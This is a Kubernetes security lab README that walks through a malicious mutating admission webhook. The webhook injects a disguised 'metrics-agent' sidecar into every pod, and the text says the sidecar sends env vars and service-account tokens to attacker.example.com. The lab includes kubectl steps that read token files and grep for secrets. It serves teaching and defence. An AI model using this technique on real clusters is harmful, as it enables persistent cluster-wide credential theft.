# Malicious Admission Controller

An attacker with permissions to create `MutatingWebhookConfiguration` objects gains a persistent, cluster-wide interception point. Every pod created — by developers, CI/CD pipelines, or operators — passes through the attacker's webhook server before it starts. The webhook can silently inject a sidecar, modify environment variables, remove security controls, or add hostPath mounts without the pod owner's knowledge.

## Description

Admission controllers are plugins that intercept API server requests before objects are persisted to etcd. There are two types:

- **ValidatingAdmissionWebhook**: Can approve or deny a request.
- **MutatingAdmissionWebhook**: Can approve, deny, **or modify** the request payload using a JSON Patch.

An attacker who gains `create`/`update` access to `MutatingWebhookConfiguration` (a cluster-scoped resource, typically requiring cluster-admin or a highly privileged role) can register an external HTTPS endpoint as a webhook. From that point forward, every matching pod creation request is sent to the attacker's server for "admission review". The server returns a JSON Patch that the API server applies transparently — no kubectl error, no visible change to the pod spec from the user's perspective.

This technique is particularly dangerous because:

1. The webhook persists across pod restarts, node failures, and deployments. Once registered, every new pod in the target scope is affected.
2. The injected sidecar runs under the pod's identity and inherits its service-account token, network access, and mounted secrets.
3. The `MutatingWebhookConfiguration` is a cluster-level resource — it affects every namespace that matches the `namespaceSelector`.

This lab demonstrates a webhook that injects a `metrics-agent` sidecar (disguised name) into every pod. The sidecar collects all environment variables and the service-account token and exfiltrates them to an attacker-controlled endpoint.

## Prerequisites

- A running Kubernetes cluster (these steps use a Kind cluster named `workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- `openssl` available on your local machine (for TLS certificate generation).
- The attacker has cluster-admin permissions (required to create `MutatingWebhookConfiguration`).

## Quick Start

The webhook server requires a valid TLS certificate because the Kubernetes API server only sends admission requests to HTTPS endpoints. The `setup-certs.sh` script generates a self-signed CA, signs a server certificate with the correct SAN, stores it as a Kubernetes Secret, and patches the `caBundle` field in the `MutatingWebhookConfiguration`.

### Step 1 — Run the certificate setup script

```bash
chmod +x setup-certs.sh
./setup-certs.sh
```

Expected output:

```
[*] Generating TLS certificate for malicious-webhook.webhook-system.svc ...
[*] Creating namespace webhook-system (if not exists) ...
[*] Storing TLS certificate as Secret webhook-tls ...
[*] Encoding CA bundle ...
[*] Patching caBundle in MutatingWebhookConfiguration ...
[*] Cleaning up temp directory ...

[+] Setup complete. Deploy the webhook server next:
    kubectl apply -f webhook-server-code.yaml
    kubectl apply -f webhook-server.yaml
```

Verify the TLS secret and the webhook configuration were created:

```bash
kubectl get secret webhook-tls -n webhook-system
kubectl get mutatingwebhookconfiguration malicious-sidecar-injector
```

Expected output:

```
NAME          TYPE                DATA   AGE
webhook-tls   kubernetes.io/tls   2      10s

NAME                        WEBHOOKS   AGE
malicious-sidecar-injector  1          10s
```

### Step 2 — Deploy the webhook server

The webhook server is a Python HTTPS server mounted via ConfigMap. Deploy the ConfigMap with the server code, then the Deployment and Service:

```bash
kubectl apply -f webhook-server-code.yaml
kubectl apply -f webhook-server.yaml
```

Wait for the webhook pod to become ready:

```bash
kubectl rollout status deployment/malicious-webhook -n webhook-system
```

Inspect the webhook server logs to confirm it is listening:

```bash
kubectl logs -n webhook-system -l app=malicious-webhook --follow &
LOG_PID=$!
```

### Step 3 — Trigger the webhook by creating a pod

Deploy a plain test pod in a non-system namespace. Because the `MutatingWebhookConfiguration` targets all namespaces except `webhook-system` and system namespaces, this pod will pass through the webhook:

```bash
kubectl apply -f test-pod.yaml
```

Observe the webhook server logs — a line should appear for the intercepted pod:

```
[webhook] Intercepted pod creation: target-namespace/test-app
[webhook] 172.23.0.4 - "POST /mutate?timeout=10s HTTP/1.1" 200 -
```

Note: The Kubernetes API server appends `?timeout=10s` to the webhook path. The server handles this correctly by matching paths with `startswith("/mutate")`.

Stop the log stream:

```bash
kill $LOG_PID 2>/dev/null || true
```

### Step 4 — Verify the sidecar was injected

Inspect the running pod. It was defined with only one container (`main`), but the webhook injected a second one (`metrics-agent`):

```bash
kubectl get pod test-app -n target-namespace \
  -o jsonpath='{range .spec.containers[*]}{.name}{"\n"}{end}'
```

Expected output:

```
main
metrics-agent
```

Describe the pod to see the full injected sidecar spec:

```bash
kubectl describe pod test-app -n target-namespace
```

Look for the `metrics-agent` container in the output. It runs a `busybox` shell that collects environment variables and the service-account token, then sends them to the exfiltration endpoint.

Compare the original pod definition (one container) with what was actually deployed (two containers):

```bash
echo "--- Original manifest containers ---"
grep "name:" test-pod.yaml | grep -v "metadata\|namespace\|app"

echo ""
echo "--- Actual running containers ---"
kubectl get pod test-app -n target-namespace \
  -o jsonpath='{range .spec.containers[*]}  - {.name}: {.image}{"\n"}{end}'
```

Expected output:

```
--- Original manifest containers ---
    - main
      name: main

--- Actual running containers ---
  - main: nginx:1.25-alpine
  - metrics-agent: busybox:1.36
```

### Step 5 — Confirm the webhook intercepts all new pods

Create another pod in a different namespace to show the cluster-wide scope:

```bash
kubectl create namespace another-namespace
kubectl run test-pod-2 \
  --image=nginx:1.25-alpine \
  --namespace=another-namespace \
  --restart=Never

kubectl get pod test-pod-2 -n another-namespace \
  -o jsonpath='{range .spec.containers[*]}{.name}{"\n"}{end}'
```

Expected output — the sidecar is present here too:

```
test-pod-2
metrics-agent
```

Every pod in the cluster (outside of excluded system namespaces) now has the attacker's sidecar injected. The compromise is persistent — deleting and recreating any pod simply re-injects the sidecar automatically.

### Step 6 — Show the exfiltration payload (simulated)

Read the `metrics-agent` sidecar logs in the test pod to see what it collected and attempted to send:

```bash
kubectl logs test-app -n target-namespace -c metrics-agent
```

Expected output:

```
[metrics-agent] Initialization complete.
```

The sidecar attempted to POST the base64-encoded environment variables and service-account token to `http://attacker.example.com/collect`. In a real attack, that endpoint would be an internet-accessible server controlled by the attacker, collecting credentials from every pod in the cluster.

To confirm what would be exfiltrated, exec into the sidecar and run the collection manually:

```bash
kubectl exec test-app -n target-namespace -c metrics-agent -- env | \
  grep -iE "(token|key|password|secret|credential)" || echo "(no secrets in env for this pod)"

kubectl exec test-app -n target-namespace -c metrics-agent -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## Cleanup

```bash
# Remove the webhook configuration first to stop interception
kubectl delete mutatingwebhookconfiguration malicious-sidecar-injector

# Remove all lab resources
kubectl delete -f test-pod.yaml --ignore-not-found
kubectl delete -f webhook-server.yaml --ignore-not-found
kubectl delete -f webhook-server-code.yaml --ignore-not-found
kubectl delete namespace webhook-system --ignore-not-found
kubectl delete namespace target-namespace --ignore-not-found
kubectl delete namespace another-namespace --ignore-not-found
kubectl delete pod test-pod-2 -n another-namespace --ignore-not-found 2>/dev/null || true
```

## Resources

- [Kubernetes Admission Controllers](https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/)
- [Dynamic Admission Control](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/)
- [MutatingWebhookConfiguration API Reference](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.27/#mutatingwebhookconfiguration-v1-admissionregistration-k8s-io)
- [JSON Patch RFC 6902](https://datatracker.ietf.org/doc/html/rfc6902)
- [MITRE ATT&CK for Kubernetes — Malicious Admission Controller](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Malicious%20admission%20controller/)
- [Sysdig — Kubernetes Admission Controllers in 5 Minutes](https://sysdig.com/blog/kubernetes-admission-controllers/)
